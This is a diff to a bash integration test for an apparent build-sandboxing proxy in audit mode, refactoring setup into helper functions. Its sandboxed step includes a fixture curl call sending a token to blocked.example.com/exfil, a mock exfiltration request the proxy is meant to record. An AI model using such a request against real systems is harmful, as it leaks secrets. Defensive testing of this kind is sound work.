@@ -4,47 +4,30 @@
 # must offer a restrict-mode allowed_url_rules example built from what was
 # actually observed.
 set -uo pipefail
-source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"
+source "$(dirname "${BASH_SOURCE[0]}")/driver-helpers.sh"
 
-REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-
-: "${BUILDCAGE_LOCAL_IMAGE_REF:?BUILDCAGE_LOCAL_IMAGE_REF must be set to a locally built inspect-engine image (BUILDCAGE_TEST_HOOKS=1 PROXY_ENGINE=inspect docker compose build proxy)}"
+require_local_image inspect
 
 echo ""
 echo "=== Inspect Engine Integration Test (audit) ==="
 echo ""
 
-echo "--- bringing up fixture origins (compose.test-inspect.yaml) ---"
-cleanup() {
-  docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" down -v >/dev/null 2>&1 || true
-}
-trap cleanup EXIT
-docker compose -f "$REPO_ROOT/compose.test-inspect.yaml" up -d --build --wait
+trap 'fixture_down inspect' EXIT
+fixture_up inspect
 
 TMPDIR=$(mktemp -d)
-touch "$TMPDIR/state.env"
-SUMMARY_FILE="$TMPDIR/summary.md"
-touch "$SUMMARY_FILE"
 
 echo "--- running the sandboxed step (proxy_engine: inspect, audit mode) ---"
-GITHUB_WORKSPACE="$TMPDIR" \
-GITHUB_STATE="$TMPDIR/state.env" \
-GITHUB_STEP_SUMMARY="$SUMMARY_FILE" \
-BUILDCAGE_RUN_DEBUG_SUMMARY_FILE="$SUMMARY_FILE" \
-BUILDCAGE_LOCAL_IMAGE_REF="$BUILDCAGE_LOCAL_IMAGE_REF" \
-BUILDCAGE_TEST_COMPOSE_FILE="$REPO_ROOT/docker/compose.action.test-inspect.yaml" \
-BUILDCAGE_TEST_CERT_PATH="$REPO_ROOT/test/test-server-inspect/cert.pem" \
-INPUT_PROXY_ENGINE="inspect" \
-INPUT_PROXY_MODE="audit" \
-INPUT_RUN="
+run_step inspect "$TMPDIR/step" \
+  INPUT_PROXY_MODE="audit" \
+  INPUT_RUN="
 S='curl -sS --max-time 10'
 \$S https://allowed.example.com/public/pkg.tgz
 \$S -X POST https://api.example.com/v1/thing
 \$S https://blocked.example.com/exfil?token=SECRET-VALUE
-true" \
-  node "$REPO_ROOT/dist/main.cjs" > "$TMPDIR/out.log" 2>&1
+true"
 RUN_EXIT=$?
-cat "$TMPDIR/out.log"
+cat "$TMPDIR/step.log"
 
 echo ""
 echo "--- exit code: $RUN_EXIT ---"
@@ -56,7 +39,7 @@ fi
 
 echo ""
 echo "--- report assertions (Job Summary) ---"
-SUMMARY=$(cat "$SUMMARY_FILE")
+SUMMARY=$(cat "$TMPDIR/step.md")
 assert_report_complete
 
 assert_summary_contains "📋 Audited Hosts" "audited-hosts heading present"
